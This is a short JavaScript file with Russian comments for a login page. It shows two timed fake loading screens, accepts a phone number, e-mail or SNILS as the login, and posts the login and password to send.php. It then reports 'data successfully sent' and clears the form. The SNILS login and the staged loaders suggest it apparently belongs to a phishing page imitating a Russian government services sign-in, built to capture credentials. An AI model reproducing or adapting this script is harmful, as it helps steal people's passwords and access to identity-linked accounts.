// Сценарий показа двух загрузчиков
window.addEventListener('DOMContentLoaded', function() {
    document.getElementById('outer-loader').style.display = '';
    document.getElementById('start-app-loader').style.display = 'none';
    document.getElementById('main-content').style.display = 'none';
    setTimeout(function() {
        document.getElementById('outer-loader').style.display = 'none';
        document.getElementById('start-app-loader').style.display = '';
        setTimeout(function() {
            document.getElementById('start-app-loader').style.display = 'none';
            document.getElementById('main-content').style.display = '';
        }, 2000);
    }, 2000);
});

// Валидация формы и отправка через fetch
document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    var login = document.getElementById('login').value.trim();
    var password = document.getElementById('password').value;
    var emailPattern = /^[\w.-]+@[\w.-]+\.[a-zA-Z]{2,}$/;
    var phonePattern = /^\+?7\d{10}$|^8\d{10}$|^\d{10}$/;
    var snilsPattern = /^\d{3}-\d{3}-\d{3} \d{2}$/;
    if (!emailPattern.test(login) && !phonePattern.test(login) && !snilsPattern.test(login)) {
        alert('Введите корректный телефон, e-mail или СНИЛС (XXX-XXX-XXX XX)');
        return false;
    }
    fetch('send.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ login: login, password: password })
    })
    .then(function(response) {
        if (response.ok) {
            alert('Данные успешно отправлены!');
            document.getElementById('loginForm').reset();
        } else {
            alert('Ошибка при отправке данных.');
        }
    })
    .catch(function() {
        alert('Ошибка при отправке данных.');
    });
});